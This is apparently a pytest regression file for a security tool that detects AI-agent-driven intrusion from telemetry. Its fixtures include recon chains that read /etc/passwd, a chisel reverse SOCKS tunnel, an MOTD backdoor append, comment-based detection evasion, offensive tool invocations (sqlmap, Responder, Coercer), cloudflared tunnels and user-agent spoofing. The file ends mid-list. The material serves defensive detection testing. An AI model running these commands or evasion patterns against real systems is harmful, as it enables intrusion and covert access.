        # Parent bash -c + immediate child binary (must NOT double-count `ss -tulpn`!)
        t += 0.04
        eid += 1
        audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=1000 uid=1000 pid=200 ppid=100 comm="bash" exe="/usr/bin/bash"')
        audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc=3 a0="bash" a1="-c" a2="{full_cmd}"')
        eid += 1
        ca_str = " ".join(f'a{i}="{a}"' for i, a in enumerate(child_args))
        audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=1000 uid=1000 pid=201 ppid=200 comm="c" exe="{child_exe}"')
        audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc={len(child_args)} {ca_str}')
        t += 2.4

    # 25s human pause then a single `sudo cp` pipeline (3 execves in 4ms — must NOT trigger think_act_bimodal_cadence!)
    t += 25.0
    for proc, argv in [
        ("/usr/bin/bash", ["bash", "-c", "sudo cp /var/log/audit/audit.log /tmp/out.log"]),
        ("/usr/bin/sudo", ["sudo", "cp", "/var/log/audit/audit.log", "/tmp/out.log"]),
        ("/usr/bin/cp", ["cp", "/var/log/audit/audit.log", "/tmp/out.log"]),
    ]:
        eid += 1
        a_str = " ".join(f'a{i}="{a}"' for i, a in enumerate(argv))
        audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=1000 uid=1000 pid=300 ppid=100 comm="x" exe="{proc}"')
        audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc={len(argv)} {a_str}')

    events = exporter.convert_auditd_lines(audit_lines, hostname="debian-srv-01")
    assert all(e["actor"] != "uid:4294967295" for e in events), "Unset auid=4294967295 must fall back to uid"
    assert any(e["actor"] == "uid:0" for e in events)

    out_jsonl = tmp_path / "debian_benign.jsonl"
    out_jsonl.write_text("\n".join(json.dumps(e) for e in events) + "\n", encoding="utf-8")
    assert scan_telemetry_file(out_jsonl) == []


def test_compact_llm_tls_loop_and_single_shot_compound_recon_tp(tmp_path: Path) -> None:
    """Falsification regression: compact real-LLM TLS loops (1.1KB->4.7KB, 540-797B resp) & compound SSH recon both fire."""
    exporter = _load_exporter()

    # 1. Compact stealth local/vLLM agent loop (real gemma4:26b stealth wire profile: 4.5s inter-turn sleep, 540-797B resp,
    #    including a 255B RFC 8446 TLS 1.3 NewSessionTicket arriving 1ms after Turn 1's request!)
    pkts: list[tuple[float, str, int, str, int, int]] = []
    t = 1795405000.0
    for idx, (ob, ib, lat, pause) in enumerate([
        (1321, 771, 0.68, 4.5),
        (2141, 771, 0.51, 4.5),
        (2817, 708, 0.42, 4.5),
        (3116, 782, 0.55, 0.01),
        (3929, 802, 0.55, 4.5),
        (4273, 738, 0.40, 0.0),
    ]):
        pkts.append((t, "192.0.2.10", 52001, "198.51.100.20", 8443, ob))
        if idx == 0:
            pkts.append((t + 0.001, "198.51.100.20", 8443, "192.0.2.10", 52001, 255))  # TLS 1.3 NewSessionTicket
        t += lat
        pkts.append((t, "198.51.100.20", 8443, "192.0.2.10", 52001, ib))
        t += pause
    pcap = tmp_path / "compact_stealth_llm.pcap"
    _write_synthetic_pcap(pcap, pkts, linktype=276)
    raw = tmp_path / "compact_raw"
    raw.mkdir()
    out_j = tmp_path / "compact.jsonl"
    exporter.convert_directory(raw, out_j, pcap_path=pcap)
    cands = scan_telemetry_file(out_j)
    assert cands and "encrypted_tls_agent_turn_loop" in cands[0].reasons

    # 2. Single-shot compound SSH recon chain (`uname -a; id; netstat -tunlp; ps aux; cat /etc/passwd`) fires endpoint_compressed_recon_burst
    recon_j = tmp_path / "compound_recon.jsonl"
    recon_j.write_text(
        json.dumps(
            {
                "timestamp": "2026-11-23T03:11:33.748Z",
                "source_host": "artex-target-01",
                "actor": "uid:1000",
                "event_type": "process",
                "surface": "endpoint",
                "appliance": "linux_auditd",
                "process": "/usr/bin/bash",
                "command_line": "bash -c uname -a; id; netstat -tunlp; ps aux | head -n 20; cat /etc/passwd | grep labops",
                "status_code": 0,
                "action": "execve",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    rcands = scan_telemetry_file(recon_j)
    assert rcands and "endpoint_compressed_recon_burst" in rcands[0].reasons


def test_motd_cloaking_and_fast_40ms_think_act_evasion_regressions(tmp_path: Path) -> None:
    """Adversarial regressions: MOTD-path/comment cloaking and 40ms sequential Think-Act bursts MUST still alert."""
    # 1. Adversarial MOTD cloaking (`# /etc/update-motd.d/` appended to malicious commands & MOTD backdoor append)
    cloak_rows = [
        {
            "timestamp": "2026-11-23T04:00:00.000Z",
            "source_host": "debian-srv-02",
            "actor": "uid:1000",
            "event_type": "process",
            "surface": "endpoint",
            "appliance": "linux_auditd",
            "process": "/usr/bin/bash",
            "command_line": "bash -c uname -a; id; netstat -tunlp; ps auxww; cat /etc/passwd # /etc/update-motd.d/",
            "status_code": 0,
            "action": "execve",
        },
        {
            "timestamp": "2026-11-23T04:00:01.000Z",
            "source_host": "debian-srv-02",
            "actor": "uid:1000",
            "event_type": "process",
            "surface": "endpoint",
            "appliance": "linux_auditd",
            "process": "/tmp/chisel",
            "command_line": "/tmp/chisel client 198.51.100.5:443 R:socks # /etc/update-motd.d/",
            "status_code": 0,
            "action": "execve",
        },
        {
            "timestamp": "2026-11-23T04:00:02.000Z",
            "source_host": "debian-srv-02",
            "actor": "uid:1000",
            "event_type": "process",
            "surface": "endpoint",
            "appliance": "linux_auditd",
            "process": "/usr/bin/dash",
            "command_line": "sh -c echo pwn >> /etc/update-motd.d/10-uname",
            "status_code": 0,
            "action": "execve",
        },
    ]
    cloak_path = tmp_path / "motd_cloak.jsonl"
    cloak_path.write_text("\n".join(json.dumps(r) for r in cloak_rows) + "\n", encoding="utf-8")
    ccands = scan_telemetry_file(cloak_path)
    assert ccands, "MOTD comment/path cloaking must never drop malicious endpoint events"
    assert len(ccands[0].sample_events) == 3, "All 3 cloaked/backdoor events must survive scaffolding filter"
    assert "endpoint_compressed_recon_burst" in ccands[0].reasons
    assert "socks_chisel_pivot_tunnel_mesh" in ccands[0].reasons

    # 2. 40ms-spaced sequential commands -> 25s LLM inference pause -> 40ms-spaced sequential commands
    #    must NOT collapse into 1 timestamp per burst (must still fire think_act_bimodal_cadence!)
    from datetime import datetime, timezone

    ta_rows = []
    t = 1795408000.0
    for burst_idx in range(2):
        for step in range(4):
            ts_str = datetime.fromtimestamp(t, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            ta_rows.append(
                {
                    "timestamp": ts_str,
                    "source_host": "debian-srv-03",
                    "actor": "uid:1000",
                    "event_type": "process",
                    "surface": "endpoint",
                    "appliance": "linux_auditd",
                    "process": f"/usr/local/bin/tool{burst_idx}_{step}",
                    "command_line": f"tool{burst_idx}_{step} --probe",
                    "status_code": 0,
                    "action": "execve",
                }
            )
            t += 0.04
        t += 25.0
    ta_path = tmp_path / "fast_40ms_think_act.jsonl"
    ta_path.write_text("\n".join(json.dumps(r) for r in ta_rows) + "\n", encoding="utf-8")
    tcands = scan_telemetry_file(ta_path)
    assert tcands and "think_act_bimodal_cadence" in tcands[0].reasons


def test_wire_http_ja4h_and_browser_ua_stack_impersonation(tmp_path: Path) -> None:
    """Time-independent ceiling breaker: real wire FoxIO JA4H + UA-vs-stack impersonation (30-min paced TP & 0 FP)."""
    exporter = _load_exporter()

    # 1. Pure-Python FoxIO JA4H spec verification on curl vs real Chrome 131 HTTP/1.1 requests
    curl_req = (
        b"GET /api/v1/jobs HTTP/1.1\r\n"
        b"Host: 192.0.2.20:8088\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0\r\n"
        b"Accept: */*\r\n\r\n"
    )
    m_c, u_c, ja4h_curl = exporter.parse_http_request_ja4h(curl_req)
    assert m_c == "GET" and u_c == "/api/v1/jobs"
    assert ja4h_curl.startswith("ge11nn030000_"), f"Unexpected curl JA4H: {ja4h_curl}"

    chrome_req = (
        b"GET /dashboard HTTP/1.1\r\n"
        b"Host: app.example.test\r\n"
        b"Connection: keep-alive\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0\r\n"
        b"Accept: text/html,application/xhtml+xml\r\n"
        b"Accept-Encoding: gzip, deflate, br\r\n"
        b"Accept-Language: en-US,en;q=0.9\r\n"
        b"Sec-Fetch-Site: none\r\n"
        b"Sec-Fetch-Mode: navigate\r\n"
        b"Sec-Fetch-Dest: document\r\n"
        b"Cookie: session=abc; theme=dark\r\n"
        b"Referer: https://app.example.test/\r\n\r\n"
    )
    m_b, u_b, ja4h_chrome = exporter.parse_http_request_ja4h(chrome_req)
    assert m_b == "GET" and u_b == "/dashboard"
    assert ja4h_chrome.startswith("ge11cr09enus_"), f"Unexpected Chrome JA4H: {ja4h_chrome}"

    # 1b. Fragmented/incomplete TCP HTTP header without `\r\n\r\n` must NOT emit a fabricated stripped JA4H
    trunc_req = b"GET /dashboard HTTP/1.1\r\nHost: app.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/131.0.0.0\r\n"
    assert exporter.parse_http_request_ja4h(trunc_req) == ("", "", "")

    # 1c. Corporate proxy HTTP CONNECT tunnel (`co11nn030000_...`) from real Chrome 131 must NOT trigger impersonation
    conn_req = (
        b"CONNECT portal.corp.example:443 HTTP/1.1\r\n"
        b"Host: portal.corp.example:443\r\n"
        b"Proxy-Connection: keep-alive\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0\r\n\r\n"
    )
    m_co, _, ja4h_connect = exporter.parse_http_request_ja4h(conn_req)
    assert m_co == "CONNECT" and ja4h_connect.startswith("co11nn030000_")

    # 2. TP A: Ultra-slow curl spoofing Chrome/131 spaced 30 MINUTES apart across 2 non-asset paths -> MUST fire!
    slow_spoof = tmp_path / "slow_30m_spoof.jsonl"
    slow_spoof.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {
                    "timestamp": "2026-11-23T01:00:00.000Z",
                    "source_host": "192.0.2.50",
                    "actor": "192.0.2.50",
                    "event_type": "http",
                    "surface": "web_portal",
                    "dest_host": "app.example.test",
                    "dest_port": 8088,
                    "http_method": "GET",
                    "http_path": "/api/v1/jobs",
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0",
                    "ja4h": ja4h_curl,
                    "status_code": 200,
                },
                {
                    "timestamp": "2026-11-23T01:30:00.000Z",
                    "source_host": "192.0.2.50",
                    "actor": "192.0.2.50",
                    "event_type": "http",
                    "surface": "web_portal",
                    "dest_host": "app.example.test",
                    "dest_port": 8088,
                    "http_method": "GET",
                    "http_path": "/.env",
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0",
                    "ja4h": ja4h_curl,
                    "status_code": 200,
                },
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    cands_spoof = scan_telemetry_file(slow_spoof)
    assert cands_spoof and "browser_ua_stack_impersonation" in cands_spoof[0].reasons

    # 3. TP B: Python OpenSSL JA4 (`t13d311100_...`, no ALPN + 31 ciphers) claiming Firefox/132 across 2 paths -> fires!
    tls_spoof = tmp_path / "tls_ua_spoof.jsonl"
    tls_spoof.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {
                    "timestamp": "2026-11-23T02:00:00.000Z",
                    "source_host": "192.0.2.51",
                    "actor": "192.0.2.51",
                    "event_type": "http",
                    "surface": "web_portal",
                    "dest_host": "app.example.test",
                    "dest_port": 443,
                    "http_method": "GET",
                    "http_path": "/api/v1/status",
                    "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "ja4": "t13d311100_e8f1e7e78f70_d41ae481755e",
                    "status_code": 200,
                },
                {
                    "timestamp": "2026-11-23T02:15:00.000Z",
                    "source_host": "192.0.2.51",
                    "actor": "192.0.2.51",
                    "event_type": "http",
                    "surface": "web_portal",
                    "dest_host": "app.example.test",
                    "dest_port": 443,
                    "http_method": "GET",
                    "http_path": "/api/v1/jobs",
                    "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "ja4": "t13d311100_e8f1e7e78f70_d41ae481755e",
                    "status_code": 200,
                },
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    cands_tls = scan_telemetry_file(tls_spoof)
    assert cands_tls and "browser_ua_stack_impersonation" in cands_tls[0].reasons

    # 4. FP Guards: Real Chrome 131 + honest curl/8.5.0 + single dev curl -A Chrome on /healthz -> ALL 0 FP!
    benign_j = tmp_path / "benign_ua_stacks.jsonl"
    benign_j.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                # Real Chrome 131
                {"timestamp": "2026-11-23T03:00:00.000Z", "source_host": "192.0.2.60", "actor": "192.0.2.60", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/dashboard", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0", "ja4": "t13d1516h2_8daaf6152771_e5627efa2ab1", "ja4h": ja4h_chrome, "status_code": 200},
                {"timestamp": "2026-11-23T03:00:08.000Z", "source_host": "192.0.2.60", "actor": "192.0.2.60", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/api/v1/jobs", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0", "ja4": "t13d1516h2_8daaf6152771_e5627efa2ab1", "ja4h": ja4h_chrome, "status_code": 200},
                # Honest curl
                {"timestamp": "2026-11-23T03:01:00.000Z", "source_host": "192.0.2.61", "actor": "192.0.2.61", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/api/v1/status", "user_agent": "curl/8.5.0", "ja4h": ja4h_curl, "status_code": 200},
                {"timestamp": "2026-11-23T03:01:10.000Z", "source_host": "192.0.2.61", "actor": "192.0.2.61", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/api/v1/jobs", "user_agent": "curl/8.5.0", "ja4h": ja4h_curl, "status_code": 200},
                # Single dev curl -A Chrome on /healthz
                {"timestamp": "2026-11-23T03:02:00.000Z", "source_host": "192.0.2.62", "actor": "192.0.2.62", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/healthz", "user_agent": "Mozilla/5.0 Chrome/131.0.0.0", "ja4h": ja4h_curl, "status_code": 200},
                # Real Chrome 131 routing HTTPS via corporate HTTP CONNECT proxy tunnels
                {"timestamp": "2026-11-23T03:03:00.000Z", "source_host": "192.0.2.63", "actor": "192.0.2.63", "event_type": "http", "surface": "web_portal", "dest_host": "portal.corp.example", "http_method": "CONNECT", "http_path": "portal.corp.example:443", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0", "ja4h": ja4h_connect, "status_code": 200},
                {"timestamp": "2026-11-23T03:03:12.000Z", "source_host": "192.0.2.63", "actor": "192.0.2.63", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.example", "http_method": "CONNECT", "http_path": "api.corp.example:443", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0", "ja4h": ja4h_connect, "status_code": 200},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    assert scan_telemetry_file(benign_j) == []


def test_causal_tls_action_loop_beats_slow_jitter_and_rejects_human_chat_noise(tmp_path: Path) -> None:
    """Causal coupling ceiling breaker: catches 15s & 90s ultra-slow agents while 0 FP on human chat + background chatter."""
    from datetime import datetime, timezone

    def _iso(ep: float) -> str:
        return datetime.fromtimestamp(ep, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

    def _make_tls_turn(src: str, dest: str, ep: float, ob: int, ib: int, lat: float, ta: float | None) -> dict:
        return {
            "timestamp": _iso(ep),
            "source_host": src,
            "actor": src,
            "event_type": "network",
            "surface": "network",
            "appliance": "pcap_tls_turn",
            "dest_host": dest,
            "dest_port": 8443,
            "bytes_out": ob,
            "bytes_in": ib,
            "action": "tls_persistent_turn",
            "raw_json": {
                "stream_id": f"{src}:50000->198.51.100.20:8443",
                "inference_latency_s": lat,
                "client_turnaround_s": ta,
                "out_duration_s": 0.01,
                "in_duration_s": 0.01,
            },
        }

    # 1. TP A: 15s-jittered stealth agent (evades <=6s encrypted_tls_agent_turn_loop!) with TLS_IN -> curl/ssh -> TLS_OUT
    evs_15s: list[dict] = []
    t = 1795410000.0
    actions_spec = [
        ("http", "/api/v1/status", 8088),
        ("http", "/api/v1/jobs", 8088),
        ("http", "/config.json", 8088),
        ("network", "", 22),
    ]
    for i, (ob, ib) in enumerate([(1320, 680), (2150, 740), (2890, 760), (3650, 720), (4520, 790)]):
        evs_15s.append(_make_tls_turn("192.0.2.70", "relay-slow.example.test", t, ob, ib, 0.55, 15.0 if i > 0 else None))
        if i < len(actions_spec):
            atype, apath, aport = actions_spec[i]
            # Agent sleeps 14.5s, executes tool, then sends result to LLM 0.5s later
            act_t = t + 0.57 + 14.5
            evs_15s.append(
                {
                    "timestamp": _iso(act_t),
                    "source_host": "192.0.2.70",
                    "actor": "192.0.2.70",
                    "event_type": atype,
                    "surface": "web_portal" if atype == "http" else "network",
                    "dest_host": "198.51.100.99",
                    "dest_port": aport,
                    "http_method": "GET" if atype == "http" else "",
                    "http_path": apath,
                    "status_code": 200 if atype == "http" else None,
                    "action": "zeek_http" if atype == "http" else "zeek_conn_SF",
                }
            )
            t = act_t + 0.5
    p_15s = tmp_path / "causal_15s.jsonl"
    p_15s.write_text("\n".join(json.dumps(e) for e in evs_15s) + "\n", encoding="utf-8")
    c_15s = scan_telemetry_file(p_15s)
    assert c_15s and "causal_tls_action_loop" in c_15s[0].reasons
    assert "encrypted_tls_agent_turn_loop" not in c_15s[0].reasons

    # 2. TP B: 90s ultra-slow agent crossing the 60s DuckDB session boundary -> Pass 10 long-horizon catches it!
    evs_90s: list[dict] = []
    t = 1795420000.0
    for i, (ob, ib) in enumerate([(1350, 690), (2200, 750), (3100, 770), (3950, 730), (4800, 800)]):
        evs_90s.append(_make_tls_turn("192.0.2.71", "relay-90s.example.test", t, ob, ib, 0.60, 90.0 if i > 0 else None))
        if i < len(actions_spec):
            atype, apath, aport = actions_spec[i]
            act_t = t + 0.62 + 89.2
            evs_90s.append(
                {
                    "timestamp": _iso(act_t),
                    "source_host": "192.0.2.71",
                    "actor": "192.0.2.71",
                    "event_type": atype,
                    "surface": "web_portal" if atype == "http" else "network",
                    "dest_host": "198.51.100.99",
                    "dest_port": aport,
                    "http_method": "GET" if atype == "http" else "",
                    "http_path": apath,
                    "status_code": 200 if atype == "http" else None,
                    "action": "zeek_http" if atype == "http" else "zeek_conn_SF",
                }
            )
            t = act_t + 0.8
    p_90s = tmp_path / "causal_90s.jsonl"
    p_90s.write_text("\n".join(json.dumps(e) for e in evs_90s) + "\n", encoding="utf-8")
    c_90s = scan_telemetry_file(p_90s)
    assert c_90s and any("causal_tls_action_loop" in c.reasons for c in c_90s)

    # 3. FP Guard: Human chatting with self-hosted LLM (15s pauses) + noisy 1Hz background telemetry daemon -> 0 FP!
    evs_fp: list[dict] = []
    t = 1795430000.0
    for i, (ob, ib) in enumerate([(1400, 900), (2400, 1100), (3500, 1200), (4700, 1300), (6100, 1400)]):
        evs_fp.append(_make_tls_turn("192.0.2.72", "internal-chat.example.test", t, ob, ib, 1.4, 15.0 if i > 0 else None))
        # Constant 1Hz background daemon hitting one telemetry endpoint during BOTH inference and pauses
        for sec in range(16):
            evs_fp.append(
                {
                    "timestamp": _iso(t + sec + 0.5),
                    "source_host": "192.0.2.72",
                    "actor": "192.0.2.72",
                    "event_type": "http",
                    "surface": "web_portal",
                    "dest_host": "telemetry.example.test",
                    "dest_port": 443,
                    "http_method": "POST",
                    "http_path": "/v1/metrics",
                    "status_code": 200,
                    "action": "zeek_http",
                }
            )
        t += 16.4
    p_fp = tmp_path / "causal_fp_noisy_human.jsonl"
    p_fp.write_text("\n".join(json.dumps(e) for e in evs_fp) + "\n", encoding="utf-8")
    assert all("causal_tls_action_loop" not in c.reasons for c in scan_telemetry_file(p_fp))

    # 4. FP Guard B: Long-horizon human chat (180s pauses) + 4 unrelated events 90s away from every LLM turn
    #    (tight_coupled_gaps == 0, total_inf_actions == 0) -> MUST produce 0 FP!
    evs_fp_slow: list[dict] = []
    t = 1795440000.0
    unrelated = ["mail.corp.example", "calendar.corp.example", "intranet.corp.example", "ntp.corp.example"]
    for i, (ob, ib) in enumerate([(1400, 900), (2400, 1100), (3500, 1200), (4700, 1300), (6100, 1400)]):
        evs_fp_slow.append(_make_tls_turn("192.0.2.73", "internal-chat.example.test", t, ob, ib, 0.6, 180.0 if i > 0 else None))
        if i < len(unrelated):
            evs_fp_slow.append(
                {
                    "timestamp": _iso(t + 90.0),
                    "source_host": "192.0.2.73",
                    "actor": "192.0.2.73",
                    "event_type": "network",
                    "surface": "network",
                    "dest_host": unrelated[i],
                    "dest_port": 443,
                    "action": "zeek_conn_SF",
                }
            )
        t += 180.6
    p_fp_slow = tmp_path / "causal_fp_long_horizon_human.jsonl"
    p_fp_slow.write_text("\n".join(json.dumps(e) for e in evs_fp_slow) + "\n", encoding="utf-8")
    assert scan_telemetry_file(p_fp_slow) == []


def test_canary_deception_tripwires_and_trusted_proxy_ingress(tmp_path: Path) -> None:
    """Zero-overtuning deterministic canaries (honey routes/tokens) & trusted L7 reverse-proxy TLS JA4 ingress guard."""
    from typer.testing import CliRunner

    from artex_defense.cli import app

    # 1. Honey-route & honey-token tripwires catch a real-browser, external-LLM, 10-hour-silent adversary at Risk 100
    canary_log = tmp_path / "canary_hit.jsonl"
    canary_log.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {
                    "timestamp": "2026-11-23T05:00:00.000Z",
                    "source_host": "198.51.100.88",
                    "actor": "198.51.100.88",
                    "event_type": "http",
                    "surface": "web_portal",
                    "dest_host": "app.example.test",
                    "http_method": "GET",
                    "http_path": "/api/v1/internal/credential-export?format=json",
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0",
                    "ja4": "t13d1516h2_8daaf6152771_e5627efa2ab1",
                    "ja4h": "ge11cn14enus_60a1c1a3a9d9_000000000000_000000000000",
                    "status_code": 200,
                },
                {
                    "timestamp": "2026-11-23T15:00:00.000Z",
                    "source_host": "203.0.113.44",
                    "actor": "AKIAIOSFODNN7CANARY9",
                    "event_type": "cloudtrail",
                    "surface": "cloud_iam",
                    "dest_host": "sts.amazonaws.com",
                    "action": "GetCallerIdentity",
                    "status_code": 200,
                },
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    cands = scan_telemetry_file(
        canary_log,
        canary_paths=["/api/v1/internal/credential-export", "/"],  # "/" must be safely ignored!
        canary_tokens=["AKIAIOSFODNN7CANARY9", "short"],  # <8-char tokens must be safely ignored!
    )
    assert len(cands) == 2
    assert all(c.risk_score == 100 and c.alert_tier == "alert" and "canary_deception_tripwire" in c.reasons for c in cands)
    assert any("canary_route:/api/v1/internal/credential-export" in ind for c in cands for ind in c.matched_indicators)
    assert any("canary_token:AKIA...ARY9" in ind for c in cands for ind in c.matched_indicators)

    # 2. Unrelated benign paths do NOT trip canaries (even when "/" or short tokens are accidentally supplied)
    benign_canary = tmp_path / "benign_no_canary.jsonl"
    benign_canary.write_text(
        json.dumps(
            {
                "timestamp": "2026-11-23T05:05:00.000Z",
                "source_host": "198.51.100.89",
                "actor": "198.51.100.89",
                "event_type": "http",
                "surface": "web_portal",
                "dest_host": "app.example.test",
                "http_method": "GET",
                "http_path": "/api/v1/internal/credential-export-v2",
                "status_code": 200,
            }
        )
        + "\n",
        encoding="utf-8",
    )
    assert (
        scan_telemetry_file(
            benign_canary,
            canary_paths=["/api/v1/internal/credential-export", "/"],
            canary_tokens=["AKIAIOSFODNN7CANARY9", "api"],
        )
        == []
    )

    # 3. Trusted L7 reverse proxy (`10.20.0.5` in `10.20.0.0/24`) re-originating OpenSSL TLS 1.2 while forwarding
    #    authentic Chrome JA4H -> 0 FP; same proxy forwarding curl-stripped JA4H -> STILL fires!
    proxy_ok = tmp_path / "l7_proxy_benign.jsonl"
    proxy_ok.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T06:00:00.000Z", "source_host": "10.20.0.5", "actor": "10.20.0.5", "event_type": "http", "surface": "web_portal", "dest_host": "origin.corp.local", "http_method": "GET", "http_path": "/dashboard", "user_agent": "Mozilla/5.0 Chrome/131.0.0.0", "ja4": "t12d311100_e8f1e7e78f70_d41ae481755e", "ja4h": "ge11cr09enus_60a1c1a3a9d9_000000000000_000000000000", "status_code": 200},
                {"timestamp": "2026-11-23T06:00:12.000Z", "source_host": "10.20.0.5", "actor": "10.20.0.5", "event_type": "http", "surface": "web_portal", "dest_host": "origin.corp.local", "http_method": "GET", "http_path": "/api/v1/jobs", "user_agent": "Mozilla/5.0 Chrome/131.0.0.0", "ja4": "t12d311100_e8f1e7e78f70_d41ae481755e", "ja4h": "ge11cr09enus_60a1c1a3a9d9_000000000000_000000000000", "status_code": 200},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    assert scan_telemetry_file(proxy_ok, trusted_proxy_ips=["10.20.0.0/24"]) == []

    proxy_spoof = tmp_path / "l7_proxy_spoof.jsonl"
    proxy_spoof.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T06:05:00.000Z", "source_host": "10.20.0.5", "actor": "10.20.0.5", "event_type": "http", "surface": "web_portal", "dest_host": "origin.corp.local", "http_method": "GET", "http_path": "/api/v1/status", "user_agent": "Mozilla/5.0 Chrome/131.0.0.0", "ja4": "t12d311100_e8f1e7e78f70_d41ae481755e", "ja4h": "ge11nn030000_2d91f4a3c1b0_000000000000_000000000000", "status_code": 200},
                {"timestamp": "2026-11-23T06:05:15.000Z", "source_host": "10.20.0.5", "actor": "10.20.0.5", "event_type": "http", "surface": "web_portal", "dest_host": "origin.corp.local", "http_method": "GET", "http_path": "/api/v1/jobs", "user_agent": "Mozilla/5.0 Chrome/131.0.0.0", "ja4": "t12d311100_e8f1e7e78f70_d41ae481755e", "ja4h": "ge11nn030000_2d91f4a3c1b0_000000000000_000000000000", "status_code": 200},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    c_pspoof = scan_telemetry_file(proxy_spoof, trusted_proxy_ips=["10.20.0.0/24"])
    assert c_pspoof and "browser_ua_stack_impersonation" in c_pspoof[0].reasons

    # 4. CLI wiring check (`artex-hunt scan --canary-path ... --canary-token ... --trusted-proxy-ip ...`)
    out_json = tmp_path / "cli_canary_out.json"
    res = CliRunner().invoke(
        app,
        [
            "scan",
            str(canary_log),
            "--canary-path",
            "/api/v1/internal/credential-export",
            "--canary-token",
            "AKIAIOSFODNN7CANARY9",
            "--trusted-proxy-ip",
            "10.20.0.0/24",
            "--out",
            str(out_json),
        ],
    )
    assert res.exit_code == 0, res.output
    saved = json.loads(out_json.read_text(encoding="utf-8"))
    assert len(saved) == 2 and all("canary_deception_tripwire" in w["reasons"] for w in saved)


def test_watchtower_interpreter_tools_folder_fp_and_new_framework_canaries(tmp_path: Path) -> None:
    """Watchtower v2.9.1/v2.9.3/v2.10.0 regressions: interpreter-wrapped tools, Responder/Coercer folder FP guard, tunnels, & canaries."""
    # 1. TPs: AI agent CLI spawning Python/Ruby/Perl offensive scripts & Agent Zero reverse tunnels
    tp_cases = [
        ("claude", "/usr/bin/python3", "python3 /opt/sqlmap/sqlmap.py -u http://192.0.2.10/login"),
        ("claude", "/usr/bin/python3", "python3 -u -m nxc smb 192.0.2.10"),
        ("codex", "/usr/bin/ruby", "ruby /opt/wpscan/wpscan.rb --url http://192.0.2.10"),
        ("opencode", "/usr/bin/perl", "perl /opt/nikto/nikto.pl -h 192.0.2.10"),
        ("claude", "/usr/bin/python3", "python3 /opt/Responder/Responder.py -I eth0"),
        ("claude", "/usr/bin/python3", "python3 /opt/Coercer/coercer.py coerce -t 192.0.2.10"),
        ("agent-zero", "/usr/bin/bash", "bash -c cloudflared tunnel --url http://127.0.0.1:8080"),
        ("agent-zero", "/usr/bin/bash", "bash -c devtunnel host -p 8080"),
        ("agent-zero", "/usr/local/bin/cloudflared", "cloudflared tunnel --url http://127.0.0.1:8080"),
        ("claude", "/usr/local/bin/devtunnel", "devtunnel host -p 8080"),
        ("claude", "/usr/bin/python3", "python3 -O -m sqlmap -u http://192.0.2.10/login"),
    ]
    for idx, (parent, proc, cmd) in enumerate(tp_cases):
        p = tmp_path / f"wt_tp_{idx}.jsonl"
        p.write_text(
            json.dumps(
                {
                    "timestamp": "2026-11-23T08:00:00.000Z",
                    "source_host": f"dev-box-{idx}",
                    "actor": "dev",
                    "event_type": "process",
                    "surface": "endpoint",
                    "parent_process": f"/usr/local/bin/{parent}",
                    "process": proc,
                    "command_line": cmd,
                    "status_code": 0,
                }
            )
            + "\n",
            encoding="utf-8",
        )
        cands = scan_telemetry_file(p)
        assert cands and "ai_agent_spawns_offensive_tool" in cands[0].reasons, f"Missed TP: {cmd}"

    # 2. FP Guards (ThreatDefence v2.9.3 exact look-alike folder & benign dev/flag cases -> 0 FP!)
    fp_cases = [
